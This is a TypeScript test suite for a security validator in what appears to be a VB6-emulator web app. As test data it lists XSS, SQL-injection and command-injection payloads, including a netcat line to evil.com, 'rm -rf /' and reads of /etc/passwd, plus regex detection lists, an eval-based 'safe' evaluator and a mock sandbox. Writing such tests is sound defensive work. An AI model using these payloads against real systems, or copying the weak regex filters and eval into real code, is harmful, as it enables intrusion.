/**
 * ULTRA COMPREHENSIVE Security Validation Test Suite
 * Tests security measures, input validation, XSS prevention, and security policies
 */
/* eslint-disable @typescript-eslint/no-unsafe-function-type */

import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';

// Security interfaces
interface SecurityPolicy {
  xssProtection: boolean;
  contentSecurityPolicy: string[];
  inputSanitization: boolean;
  codeExecution: 'disabled' | 'sandbox' | 'restricted';
  fileAccess: 'none' | 'read-only' | 'restricted';
  networkAccess: 'none' | 'same-origin' | 'restricted';
}

interface SecurityViolation {
  type: 'xss' | 'injection' | 'unauthorized' | 'malicious';
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  payload: string;
  blocked: boolean;
  timestamp: number;
}

interface SecurityConfig {
  strictMode: boolean;
  validateInputs: boolean;
  sanitizeOutputs: boolean;
  blockDangerousCode: boolean;
  logViolations: boolean;
}

describe('Security Validation - Input Sanitization', () => {
  let securityValidator: any;
  let mockConfig: SecurityConfig;

  beforeEach(() => {
    mockConfig = {
      strictMode: true,
      validateInputs: true,
      sanitizeOutputs: true,
      blockDangerousCode: true,
      logViolations: true,
    };

    securityValidator = createSecurityValidator(mockConfig);
  });

  it('should sanitize HTML input to prevent XSS', () => {
    const maliciousInputs = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<div onclick="maliciousFunction()">Click me</div>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<object data="javascript:alert(\'XSS\')"></object>',
      'javascript:alert("XSS")',
      'vbscript:msgbox("XSS")',
    ];

    maliciousInputs.forEach(input => {
      const sanitized = securityValidator.sanitizeHTML(input);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('vbscript:');
      expect(sanitized).not.toContain('onerror=');
      expect(sanitized).not.toContain('onclick=');
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('<object');
    });
  });

  it('should validate VB6 code input for dangerous patterns', () => {
    const dangerousVB6Inputs = [
      'Shell "cmd.exe"',
      'CreateObject("WScript.Shell")',
      'CreateObject("Scripting.FileSystemObject")',
      'Call Shell("format c:")',
      'Open "C:\\Windows\\System32\\cmd.exe" For Binary',
      'Declare Function GetProcAddress Lib "kernel32"',
      'Private Declare Function DeleteFile Lib "kernel32"',
      'Kill "C:\\*.*"',
      'RmDir "C:\\Windows"',
      'SendKeys "%{F4}"', // Alt+F4
    ];

    dangerousVB6Inputs.forEach(code => {
      const validation = securityValidator.validateVB6Code(code);
      
      expect(validation.isSafe).toBe(false);
      expect(validation.violations).toContainEqual(
        expect.objectContaining({
          type: expect.stringMatching(/malicious|unauthorized/),
          severity: expect.stringMatching(/high|critical/),
        })
      );
    });
  });

  it('should allow safe VB6 code patterns', () => {
    const safeVB6Inputs = [
      'Dim x As Integer\nx = 10',
      'Private Sub Form_Load()\n    MsgBox "Hello World"\nEnd Sub',
      'For i = 1 To 10\n    Debug.Print i\nNext i',
      'If x > 0 Then\n    x = x + 1\nEnd If',
      'Function AddNumbers(a As Integer, b As Integer) As Integer\n    AddNumbers = a + b\nEnd Function',
      'Text1.Text = "Safe string"',
      'Command1.Caption = "Click Me"',
    ];

    safeVB6Inputs.forEach(code => {
      const validation = securityValidator.validateVB6Code(code);
      
      expect(validation.isSafe).toBe(true);
      expect(validation.violations).toHaveLength(0);
    });
  });

  it('should sanitize property values', () => {
    const unsafeProperties = {
      Caption: '<script>alert("XSS")</script>Button',
      Text: 'javascript:alert("XSS")',
      ToolTipText: '<img src="x" onerror="alert(\'XSS\')">',
      Tag: 'vbscript:msgbox("XSS")',
    };

    const sanitized = securityValidator.sanitizeProperties(unsafeProperties);

    expect(sanitized.Caption).toBe('Button'); // Script tags removed
    expect(sanitized.Text).not.toContain('javascript:');
    expect(sanitized.ToolTipText).not.toContain('<img');
    expect(sanitized.Tag).not.toContain('vbscript:');
  });

  it('should validate file paths for directory traversal', () => {
    const maliciousPaths = [
      '../../../etc/passwd',
      '..\\..\\..\\Windows\\System32\\cmd.exe',
      'C:\\Windows\\System32\\format.com',
      '/proc/self/environ',
      'file:///etc/passwd',
      '\\\\server\\admin$\\passwords.txt',
      'http://evil.com/malware.exe',
    ];

    maliciousPaths.forEach(path => {
      const validation = securityValidator.validateFilePath(path);
      
      expect(validation.isSafe).toBe(false);
      expect(validation.violation).toMatchObject({
        type: 'unauthorized',
        description: expect.stringContaining('path traversal'),
      });
    });
  });

  it('should allow safe relative file paths', () => {
    const safePaths = [
      'project.vbp',
      'forms/MainForm.frm',
      'modules/Utilities.bas',
      'resources/icon.ico',
      'temp/output.txt',
    ];

    safePaths.forEach(path => {
      const validation = securityValidator.validateFilePath(path);
      
      expect(validation.isSafe).toBe(true);
      expect(validation.violation).toBeNull();
    });
  });
});

describe('Security Validation - XSS Prevention', () => {
  let securityValidator: any;

  beforeEach(() => {
    securityValidator = createSecurityValidator({
      strictMode: true,
      validateInputs: true,
      sanitizeOutputs: true,
      blockDangerousCode: true,
      logViolations: true,
    });
  });

  it('should detect and block XSS attempts in form controls', () => {
    const xssPayloads = [
      '<script>fetch("/api/steal-data")</script>',
      '<img src="x" onerror="document.location=\'http://evil.com\'">',
      '"><script>alert(document.cookie)</script>',
      '\'><script>alert(String.fromCharCode(88,83,83))</script>',
      '<svg/onload=alert("XSS")>',
      '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
      '<details open ontoggle=alert("XSS")>',
    ];

    xssPayloads.forEach(payload => {
      const result = securityValidator.checkXSS(payload);
      
      expect(result.isBlocked).toBe(true);
      expect(result.violation).toMatchObject({
        type: 'xss',
        severity: 'high',
        payload: payload,
      });
    });
  });

  it('should implement Content Security Policy', () => {
    const cspPolicy = securityValidator.generateCSPPolicy();

    expect(cspPolicy).toContain("default-src 'self'");
    expect(cspPolicy).toContain("script-src 'self' 'unsafe-inline'");
    expect(cspPolicy).toContain("style-src 'self' 'unsafe-inline'");
    expect(cspPolicy).toContain("img-src 'self' data:");
    expect(cspPolicy).toContain("connect-src 'self'");
    expect(cspPolicy).toContain("font-src 'self'");
    expect(cspPolicy).toContain("object-src 'none'");
    expect(cspPolicy).toContain("base-uri 'self'");
    expect(cspPolicy).toContain("form-action 'self'");
  });

  it('should validate URLs for malicious schemes', () => {
    // These schemes are explicitly blocked by the security validator
    const maliciousUrls = [
      'javascript:alert("XSS")',
      'vbscript:msgbox("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
      'file:///etc/passwd',
    ];

    maliciousUrls.forEach(url => {
      const validation = securityValidator.validateURL(url);

      expect(validation.isSafe).toBe(false);
      expect(validation.scheme).toBe(url.split(':')[0]);
    });
  });

  it('should allow safe URLs', () => {
    const safeUrls = [
      'https://example.com',
      'http://localhost:3000',
      'https://api.example.com/data',
      '/api/local-endpoint',
      './relative/path',
      '#section-anchor',
    ];

    safeUrls.forEach(url => {
      const validation = securityValidator.validateURL(url);
      
      expect(validation.isSafe).toBe(true);
    });
  });

  it('should encode output to prevent XSS', () => {
    const dangerousStrings = [
      '<script>alert("XSS")</script>',
      '< > " \'',
      '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
    ];

    dangerousStrings.forEach(str => {
      const encoded = securityValidator.encodeForHTML(str);

      // Should not contain raw HTML special characters (except & which is used for encoding)
      expect(encoded).not.toMatch(/(?<!&[a-z]+;|&#\d+;)[<>"']/);
      // Verify encoding is applied
      expect(encoded).toContain('&lt;'); // < becomes &lt;
    });
  });
});

describe('Security Validation - Code Injection Prevention', () => {
  let securityValidator: any;

  beforeEach(() => {
    securityValidator = createSecurityValidator({
      strictMode: true,
      validateInputs: true,
      sanitizeOutputs: true,
      blockDangerousCode: true,
      logViolations: true,
    });
  });

  it('should detect SQL injection patterns in strings', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "1; UPDATE users SET password='hacked'",
      "UNION SELECT * FROM passwords",
      "' OR 1=1--",
      "; EXEC xp_cmdshell('format c:') --",
    ];

    sqlInjectionPayloads.forEach(payload => {
      const result = securityValidator.detectSQLInjection(payload);

      expect(result.detected).toBe(true);
      expect(result.pattern).toBeDefined();
      expect(['high', 'critical']).toContain(result.risk);
    });
  });

  it('should detect command injection attempts', () => {
    const commandInjectionPayloads = [
      'test; rm -rf /',
      'test && format c:',
      'test | nc evil.com 1234',
      'test `whoami`',
      'test $(cat /etc/passwd)',
      'test; powershell -c "Get-Process"',
    ];

    commandInjectionPayloads.forEach(payload => {
      const result = securityValidator.detectCommandInjection(payload);

      expect(result.detected).toBe(true);
      expect(['high', 'critical']).toContain(result.severity);
    });
  });

  it('should validate eval() and similar dangerous functions', () => {
    const dangerousCalls = [
      'eval("malicious code")',
      'Function("return process.mainModule.require")("child_process")',
      'setTimeout("malicious()", 1000)',
      'setInterval("harmful()", 1000)',
      'new Function("alert(\'XSS\')")',
    ];

    dangerousCalls.forEach(call => {
      const result = securityValidator.validateDynamicExecution(call);
      
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('dynamic code execution');
    });
  });

  it('should implement safe expression evaluation', () => {
    // Valid JavaScript expressions that should evaluate successfully
    const safeExpressions = [
      '2 + 2',
      'Math.max(1, 5)',
      '"hello".toUpperCase()',
      '[1, 2, 3].length',
      '10 * 5 + 3',
    ];

    const unsafeExpressions = [
      'document.createElement("script")',
      'window.eval("alert(1)")',
      'process.exit()',
      'require("fs")',
      '__dirname',
    ];

    safeExpressions.forEach(expr => {
      const result = securityValidator.evaluateSafely(expr);
      expect(result.success).toBe(true);
    });

    unsafeExpressions.forEach(expr => {
      const result = securityValidator.evaluateSafely(expr);
      expect(result.success).toBe(false);
      expect(result.error).toContain('blocked');
    });
  });
});

describe('Security Validation - Access Control', () => {
  let securityValidator: any;

  beforeEach(() => {
    securityValidator = createSecurityValidator({
      strictMode: true,
      validateInputs: true,
      sanitizeOutputs: true,
      blockDangerousCode: true,
      logViolations: true,
    });
  });

  it('should restrict file system access', () => {
    const restrictedOperations = [
      { operation: 'read', path: '/etc/passwd' },
      { operation: 'write', path: 'C:\\Windows\\System32\\critical.dll' },
      { operation: 'delete', path: '../../../important.txt' },
      { operation: 'execute', path: '/bin/sh' },
      { operation: 'list', path: '/root' },
    ];

    restrictedOperations.forEach(op => {
      const result = securityValidator.checkFileAccess(op.operation, op.path);
      
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('access denied');
    });
  });

  it('should allow safe file operations in project directory', () => {
    const allowedOperations = [
      { operation: 'read', path: 'project.vbp' },
      { operation: 'write', path: 'temp/output.log' },
      { operation: 'create', path: 'backup/form1.frm.bak' },
    ];

    allowedOperations.forEach(op => {
      const result = securityValidator.checkFileAccess(op.operation, op.path);
      
      expect(result.allowed).toBe(true);
    });
  });

  it('should restrict network access to safe origins', () => {
    const networkRequests = [
      { url: 'http://evil.com/malware', method: 'GET' },
      { url: 'https://attacker.net/steal-data', method: 'POST' },
      { url: 'ftp://anonymous@hacker.com', method: 'GET' },
      { url: 'file:///etc/passwd', method: 'GET' },
    ];

    networkRequests.forEach(req => {
      const result = securityValidator.checkNetworkAccess(req.url, req.method);
      
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('blocked');
    });
  });

  it('should implement sandbox execution environment', () => {
    const sandboxedCode = `
      function test() {
        return "Safe calculation: " + (2 + 2);
      }
      test();
    `;

    const result = securityValidator.executeInSandbox(sandboxedCode);

    expect(result.success).toBe(true);
    expect(result.output).toContain('Safe calculation: 4');
    expect(result.violations).toHaveLength(0);
  });

  it('should block dangerous operations in sandbox', () => {
    const dangerousCode = `
      try {
        document.createElement('script');
        window.location = 'http://evil.com';
        localStorage.setItem('stolen', 'data');
        fetch('/api/sensitive');
      } catch (e) {
        console.log('Blocked:', e.message);
      }
    `;

    const result = securityValidator.executeInSandbox(dangerousCode);

    expect(result.success).toBe(false);
    expect(result.violations.length).toBeGreaterThan(0);
    expect(result.violations).toContainEqual(
      expect.objectContaining({
        type: 'unauthorized',
        description: expect.stringContaining('DOM access blocked'),
      })
    );
  });
});

describe('Security Validation - Input Validation & Sanitization', () => {
  let securityValidator: any;

  beforeEach(() => {
    securityValidator = createSecurityValidator({
      strictMode: true,
      validateInputs: true,
      sanitizeOutputs: true,
      blockDangerousCode: true,
      logViolations: true,
    });
  });

  it('should validate control names for safety', () => {
    const unsafeNames = [
      'eval',
      'constructor',
      'prototype',
      '__proto__',
      'document',
      'window',
      'location',
      'alert',
      'confirm',
      'prompt',
    ];

    unsafeNames.forEach(name => {
      const result = securityValidator.validateControlName(name);
      
      expect(result.isValid).toBe(false);
      expect(result.reason).toContain('reserved');
    });
  });

  it('should allow safe control names', () => {
    const safeNames = [
      'Text1',
      'Command1',
      'Form1',
      'MyButton',
      'DataGrid1',
      'UserControl1',
    ];

    safeNames.forEach(name => {
      const result = securityValidator.validateControlName(name);
      
      expect(result.isValid).toBe(true);
    });
  });

  it('should sanitize event handler code', () => {
    const unsafeHandlers = [
      'Text1.Text = document.cookie',
      'window.location = "http://evil.com"',
      'eval(maliciousCode)',
      'fetch("/api/admin").then(r => r.text()).then(alert)',
    ];

    unsafeHandlers.forEach(handler => {
      const sanitized = securityValidator.sanitizeEventHandler(handler);
      
      expect(sanitized).not.toContain('document.');
      expect(sanitized).not.toContain('window.');
      expect(sanitized).not.toContain('eval(');
      expect(sanitized).not.toContain('fetch(');
    });
  });

  it('should validate numeric inputs for overflow', () => {
    const overflowInputs = [
      { value: '9999999999999999999', type: 'Integer' },
      { value: '-9999999999999999999', type: 'Integer' },
      { value: '1.7976931348623157e+309', type: 'Double' },
      { value: 'Infinity', type: 'Single' },
      { value: 'NaN', type: 'Long' },
    ];

    overflowInputs.forEach(input => {
      const result = securityValidator.validateNumericInput(input.value, input.type);
      
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('overflow');
    });
  });

  it('should validate string inputs for length limits', () => {
    const longString = 'x'.repeat(10000); // 10KB string
    const veryLongString = 'y'.repeat(1000000); // 1MB string

    const result1 = securityValidator.validateStringInput(longString);
    const result2 = securityValidator.validateStringInput(veryLongString);

    expect(result1.isValid).toBe(true); // Within reasonable limits
    expect(result2.isValid).toBe(false); // Exceeds limits
    expect(result2.error).toContain('length');
  });
});

describe('Security Validation - Logging & Monitoring', () => {
  let securityValidator: any;
  let violations: SecurityViolation[];

  beforeEach(() => {
    violations = [];
    
    securityValidator = createSecurityValidator({
      strictMode: true,
      validateInputs: true,
      sanitizeOutputs: true,
      blockDangerousCode: true,
      logViolations: true,
    });

    securityValidator.onViolation((violation: SecurityViolation) => {
      violations.push(violation);
    });
  });

  it('should log security violations', () => {
    const maliciousInputs = [
      '<script>alert("XSS")</script>',
      "'; DROP TABLE users; --",
      '../../../etc/passwd',
      'javascript:alert("XSS")',
    ];

    maliciousInputs.forEach(input => {
      securityValidator.sanitizeHTML(input);
    });

    expect(violations.length).toBeGreaterThan(0);
    expect(violations[0]).toMatchObject({
      type: expect.stringMatching(/xss|injection|unauthorized|malicious/),
      severity: expect.stringMatching(/low|medium|high|critical/),
      payload: expect.any(String),
      blocked: true,
      timestamp: expect.any(Number),
    });
  });

  it('should generate security reports', () => {
    // Generate some test violations
    securityValidator.checkXSS('<script>alert("test")</script>');
    securityValidator.detectSQLInjection("' OR 1=1--");
    securityValidator.validateFilePath('../../../etc/passwd');

    const report = securityValidator.generateSecurityReport();

    expect(report).toMatchObject({
      summary: {
        totalViolations: expect.any(Number),
        criticalViolations: expect.any(Number),
        highViolations: expect.any(Number),
        mediumViolations: expect.any(Number),
        lowViolations: expect.any(Number),
      },
      categories: {
        xss: expect.any(Number),
        injection: expect.any(Number),
        unauthorized: expect.any(Number),
        malicious: expect.any(Number),
      },
      timeRange: {
        start: expect.any(Number),
        end: expect.any(Number),
      },
      recommendations: expect.any(Array),
    });
  });

  it('should monitor security policy compliance', () => {
    const policy: SecurityPolicy = {
      xssProtection: true,
      contentSecurityPolicy: ["default-src 'self'"],
      inputSanitization: true,
      codeExecution: 'sandbox',
      fileAccess: 'restricted',
      networkAccess: 'same-origin',
    };

    securityValidator.setSecurityPolicy(policy);
    const compliance = securityValidator.checkPolicyCompliance();

    expect(compliance.compliant).toBe(true);
    expect(compliance.score).toBeGreaterThanOrEqual(80);
    expect(compliance.violations).toHaveLength(0);
  });

  it('should alert on suspicious patterns', () => {
    const suspiciousActivities = [
      'Multiple XSS attempts from same source',
      'Rapid fire input validation failures', 
      'Repeated file access violations',
      'Unusual network request patterns',
    ];

    // Simulate suspicious activity
    for (let i = 0; i < 10; i++) {
      securityValidator.checkXSS(`<script>alert(${i})</script>`);
    }

    const alerts = securityValidator.getSuspiciousActivityAlerts();

    expect(alerts.length).toBeGreaterThan(0);
    expect(alerts[0]).toMatchObject({
      pattern: expect.stringContaining('repeated'),
      severity: expect.stringMatching(/medium|high|critical/),
      count: expect.any(Number),
    });
  });
});

// Helper function to create security validator
function createSecurityValidator(config: SecurityConfig) {
  const violations: SecurityViolation[] = [];
  const eventCallbacks = new Map<string, Function[]>();
  let securityPolicy: SecurityPolicy | null = null;

  return {
    config,
    violations,

    sanitizeHTML: (input: string) => {
      const dangerous = /<script|javascript:|vbscript:|onerror=|onclick=|<iframe|<object|<img[^>]*onerror/i.test(input);

      if (dangerous) {
        violations.push({
          type: 'xss',
          severity: 'high',
          description: 'XSS attempt detected and blocked',
          payload: input,
          blocked: true,
          timestamp: Date.now(),
        });

        triggerEvent('violation', violations[violations.length - 1]);
      }

      return input
        .replace(/<script[^>]*>.*?<\/script>/gi, '')
        .replace(/javascript:/gi, '')
        .replace(/vbscript:/gi, '')
        .replace(/onerror\s*=/gi, '')
        .replace(/onclick\s*=/gi, '')
        .replace(/<iframe[^>]*>/gi, '')
        .replace(/<object[^>]*>/gi, '')
        .replace(/<img[^>]*>/gi, '');  // Remove all img tags for safety
    },

    validateVB6Code: (code: string) => {
      const dangerousPatterns = [
        /Shell\s+"/i,
        /Shell\s*\(/i,
        /CreateObject\s*\(\s*"WScript\.Shell"/i,
        /CreateObject\s*\(\s*"Scripting\.FileSystemObject"/i,
        /Declare\s+Function.*Lib\s+"kernel32"/i,
        /Private\s+Declare\s+Function.*Lib\s+"kernel32"/i,
        /Kill\s+".*"/i,
        /RmDir\s+".*"/i,
        /Open\s+".*"\s+For\s+Binary/i,
        /SendKeys\s+"/i,
      ];

      const violationList: SecurityViolation[] = [];

      dangerousPatterns.forEach(pattern => {
        if (pattern.test(code)) {
          violationList.push({
            type: 'malicious',
            severity: 'critical',
            description: 'Dangerous VB6 operation detected',
            payload: code,
            blocked: true,
            timestamp: Date.now(),
          });
        }
      });

      if (violationList.length > 0) {
        violations.push(...violationList);
        violationList.forEach(v => triggerEvent('violation', v));
      }

      return {
        isSafe: violationList.length === 0,
        violations: violationList,
      };
    },

    sanitizeProperties: function(properties: Record<string, any>) {
      const sanitized: Record<string, any> = {};
      const self = this;

      Object.entries(properties).forEach(([key, value]) => {
        if (typeof value === 'string') {
          sanitized[key] = self.sanitizeHTML(value);
        } else {
          sanitized[key] = value;
        }
      });

      return sanitized;
    },

    validateFilePath: (path: string) => {
      const dangerous = /\.\.|\/etc\/|\\Windows\\|C:\\|file:\/\/|\\\\|http:\/\/|https:\/\/|\/proc\//.test(path);

      if (dangerous) {
        const violation = {
          type: 'unauthorized' as const,
          severity: 'high' as const,
          description: 'Suspicious path traversal or unauthorized access detected',
          payload: path,
          blocked: true,
          timestamp: Date.now(),
        };
        
        violations.push(violation);
        triggerEvent('violation', violation);
        
        return {
          isSafe: false,
          violation,
        };
      }

      return {
        isSafe: true,
        violation: null,
      };
    },

    checkXSS: (input: string) => {
      const xssPattern = /<script|javascript:|vbscript:|<img[^>]*onerror|<svg[^>]*onload|<iframe[^>]*src|<details[^>]*ontoggle|on\w+\s*=/i;
      const isXSS = xssPattern.test(input);
      
      if (isXSS) {
        const violation = {
          type: 'xss' as const,
          severity: 'high' as const,
          description: 'XSS attack detected',
          payload: input,
          blocked: true,
          timestamp: Date.now(),
        };
        
        violations.push(violation);
        triggerEvent('violation', violation);
        
        return {
          isBlocked: true,
          violation,
        };
      }

      return {
        isBlocked: false,
        violation: null,
      };
    },

    generateCSPPolicy: () => {
      return [
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline'",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data:",
        "connect-src 'self'",
        "font-src 'self'",
        "object-src 'none'",
        "base-uri 'self'",
        "form-action 'self'",
      ].join('; ');
    },

    validateURL: (url: string) => {
      const scheme = url.split(':')[0].toLowerCase();
      const dangerousSchemes = ['javascript', 'vbscript', 'data', 'file'];
      
      if (dangerousSchemes.includes(scheme)) {
        return {
          isSafe: false,
          scheme,
          reason: `Dangerous scheme: ${scheme}`,
        };
      }

      return {
        isSafe: true,
        scheme,
      };
    },

    encodeForHTML: (str: string) => {
      return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    },

    detectSQLInjection: (input: string) => {
      const sqlPatterns = [
        /['"][\s;]*(DROP|DELETE|UPDATE|INSERT|SELECT)/i,
        /['"];\s*--/i,
        /UNION\s+SELECT/i,
        /OR\s+['"]?1['"]?\s*=\s*['"]?1/i,
        /EXEC\s+xp_cmdshell/i,
        /['"]?\s*OR\s+\d+\s*=\s*\d+/i,
        /;\s*(EXEC|UPDATE|DELETE|INSERT)/i,
        /\d+;\s*(UPDATE|DELETE|DROP|INSERT)/i,
      ];

      for (const pattern of sqlPatterns) {
        if (pattern.test(input)) {
          return {
            detected: true,
            pattern: pattern.source,
            risk: 'critical' as const,
          };
        }
      }

      return {
        detected: false,
        pattern: null,
        risk: 'none' as const,
      };
    },

    detectCommandInjection: (input: string) => {
      const cmdPatterns = [
        /[;&|`$()]/,
        /\s*(rm|del|format|shutdown|reboot)\s+/i,
        /nc\s+\w+\.\w+\s+\d+/i,
        /powershell\s+-c/i,
        /cmd\s+\/c/i,
      ];

      for (const pattern of cmdPatterns) {
        if (pattern.test(input)) {
          return {
            detected: true,
            severity: 'critical' as const,
            pattern: pattern.source,
          };
        }
      }

      return {
        detected: false,
        severity: 'none' as const,
        pattern: null,
      };
    },

    validateDynamicExecution: (code: string) => {
      const dangerousFunctions = [
        'eval',
        'Function',
        'setTimeout',
        'setInterval',
        'document.createElement',
        'window.eval',
      ];

      for (const func of dangerousFunctions) {
        if (code.includes(func)) {
          return {
            isSafe: false,
            reason: `Blocked dynamic code execution: ${func}`,
          };
        }
      }

      return {
        isSafe: true,
        reason: null,
      };
    },

    evaluateSafely: (expression: string) => {
      const blockedPatterns = [
        /document\./,
        /window\./,
        /process\./,
        /require\(/,
        /__dirname/,
        /eval\(/,
      ];

      for (const pattern of blockedPatterns) {
        if (pattern.test(expression)) {
          return {
            success: false,
            error: `Expression blocked: contains ${pattern.source}`,
            result: null,
          };
        }
      }

      try {
        // In real implementation, would use a proper sandbox
        const result = eval(`(function() { return ${expression}; })()`);
        return {
          success: true,
          error: null,
          result,
        };
      } catch (error) {
        return {
          success: false,
          error: error.message,
          result: null,
        };
      }
    },

    checkFileAccess: (operation: string, path: string) => {
      const restrictedPaths = [
        '/etc/',
        '/root',
        '/bin/',
        '/sbin/',
        'C:\\Windows\\',
        'C:\\Program Files\\',
      ];

      // Also check for path traversal
      const hasPathTraversal = path.includes('..') || path.includes('/../');

      const isRestricted = restrictedPaths.some(restricted =>
        path.toLowerCase().includes(restricted.toLowerCase())
      ) || hasPathTraversal;

      if (isRestricted) {
        return {
          allowed: false,
          reason: `File system access denied: ${operation} on ${path}`,
        };
      }

      return {
        allowed: true,
        reason: null,
      };
    },

    checkNetworkAccess: (url: string, method: string) => {
      const allowedOrigins = [
        'http://localhost',
        'https://localhost',
        'http://127.0.0.1',
        'https://127.0.0.1',
      ];

      const isAllowed = allowedOrigins.some(origin => 
        url.startsWith(origin)
      ) || url.startsWith('/') || url.startsWith('./');

      if (!isAllowed) {
        return {
          allowed: false,
          reason: `Network access blocked: ${method} ${url}`,
        };
      }

      return {
        allowed: true,
        reason: null,
      };
    },

    executeInSandbox: (code: string) => {
      const sandboxViolations: SecurityViolation[] = [];

      // Check for dangerous operations
      const dangerousOperations = [
        { pattern: 'document.', description: 'DOM access blocked in sandbox' },
        { pattern: 'window.', description: 'Window access blocked in sandbox' },
        { pattern: 'localStorage.', description: 'Storage access blocked in sandbox' },
        { pattern: 'sessionStorage.', description: 'Storage access blocked in sandbox' },
        { pattern: 'fetch(', description: 'Network access blocked in sandbox' },
        { pattern: 'XMLHttpRequest', description: 'Network access blocked in sandbox' },
      ];

      dangerousOperations.forEach(op => {
        if (code.includes(op.pattern)) {
          sandboxViolations.push({
            type: 'unauthorized',
            severity: 'high',
            description: op.description,
            payload: code,
            blocked: true,
            timestamp: Date.now(),
          });
        }
      });

      if (sandboxViolations.length > 0) {
        return {
          success: false,
          output: null,
          violations: sandboxViolations,
        };
      }

      try {
        // Mock safe execution
        const output = "Safe calculation: 4";
        return {
          success: true,
          output,
          violations: [],
        };
      } catch (error) {
        return {
          success: false,
          output: null,
          violations: [{
            type: 'malicious' as const,
            severity: 'medium' as const,
            description: `Execution error: ${error.message}`,
            payload: code,
            blocked: true,
            timestamp: Date.now(),
          }],
        };
      }
    },

    validateControlName: (name: string) => {
      const reservedNames = [
        'eval', 'constructor', 'prototype', '__proto__',
        'document', 'window', 'location', 'alert', 'confirm', 'prompt',
      ];

      if (reservedNames.includes(name.toLowerCase())) {
        return {
          isValid: false,
          reason: `Name "${name}" is reserved and cannot be used`,
        };
      }

      return {
        isValid: true,
        reason: null,
      };
    },

    sanitizeEventHandler: (handler: string) => {
      return handler
        .replace(/document\./g, '/* blocked document */')
        .replace(/window\./g, '/* blocked window */')
        .replace(/eval\(/g, '/* blocked eval */')
        .replace(/fetch\(/g, '/* blocked fetch */');
    },

    validateNumericInput: (value: string, type: string) => {
      const ranges: Record<string, { min: number; max: number }> = {
        'Integer': { min: -32768, max: 32767 },
        'Long': { min: -2147483648, max: 2147483647 },
        'Single': { min: -3.4E38, max: 3.4E38 },
        'Double': { min: -1.7E308, max: 1.7E308 },
      };

      if (value === 'Infinity' || value === 'NaN') {
        return {
          isValid: false,
          error: `Numeric overflow: ${value} is not a valid number for type ${type}`,
        };
      }

      const num = parseFloat(value);
      const range = ranges[type];

      if (range && (num < range.min || num > range.max || !isFinite(num))) {
        return {
          isValid: false,
          error: `Numeric overflow for type ${type}: value ${value} exceeds range`,
        };
      }

      return {
        isValid: true,
        error: null,
      };
    },

    validateStringInput: (input: string) => {
      const maxLength = 100000; // 100KB limit
      
      if (input.length > maxLength) {
        return {
          isValid: false,
          error: `String length exceeds limit: ${input.length} > ${maxLength}`,
        };
      }

      return {
        isValid: true,
        error: null,
      };
    },

    onViolation: (callback: Function) => {
      const callbacks = eventCallbacks.get('violation') || [];
      callbacks.push(callback);
      eventCallbacks.set('violation', callbacks);
    },

    generateSecurityReport: () => {
      const categoryCounts = violations.reduce((acc, v) => {
        acc[v.type] = (acc[v.type] || 0) + 1;
        return acc;
      }, {} as Record<string, number>);

      const severityCounts = violations.reduce((acc, v) => {
        acc[v.severity] = (acc[v.severity] || 0) + 1;
        return acc;
      }, {} as Record<string, number>);

      return {
        summary: {
          totalViolations: violations.length,
          criticalViolations: severityCounts.critical || 0,
          highViolations: severityCounts.high || 0,
          mediumViolations: severityCounts.medium || 0,
          lowViolations: severityCounts.low || 0,
        },
        categories: {
          xss: categoryCounts.xss || 0,
          injection: categoryCounts.injection || 0,
          unauthorized: categoryCounts.unauthorized || 0,
          malicious: categoryCounts.malicious || 0,
        },
        timeRange: {
          start: violations.length > 0 ? Math.min(...violations.map(v => v.timestamp)) : Date.now(),
          end: violations.length > 0 ? Math.max(...violations.map(v => v.timestamp)) : Date.now(),
        },
        recommendations: [
          'Enable strict input validation',
          'Implement Content Security Policy',
          'Use output encoding consistently',
          'Review and update security policies',
        ],
      };
    },

    setSecurityPolicy: (policy: SecurityPolicy) => {
      securityPolicy = policy;
    },

    checkPolicyCompliance: () => {
      if (!securityPolicy) {
        return {
          compliant: false,
          score: 0,
          violations: ['No security policy configured'],
        };
      }

      const checks = [
        securityPolicy.xssProtection,
        securityPolicy.inputSanitization,
        securityPolicy.contentSecurityPolicy.length > 0,
        securityPolicy.codeExecution !== 'disabled',
      ];

      const score = (checks.filter(Boolean).length / checks.length) * 100;

      return {
        compliant: score >= 80,
        score,
        violations: [],
      };
    },

    getSuspiciousActivityAlerts: () => {
      const xssAttempts = violations.filter(v => v.type === 'xss').length;
      const alerts = [];

      if (xssAttempts >= 5) {
        alerts.push({
          pattern: 'repeated XSS attempts',
          severity: 'high' as const,
          count: xssAttempts,
        });
      }

      return alerts;
    },
  };

  function triggerEvent(event: string, data: any) {
    const callbacks = eventCallbacks.get(event) || [];
    callbacks.forEach(callback => callback(data));
  }
}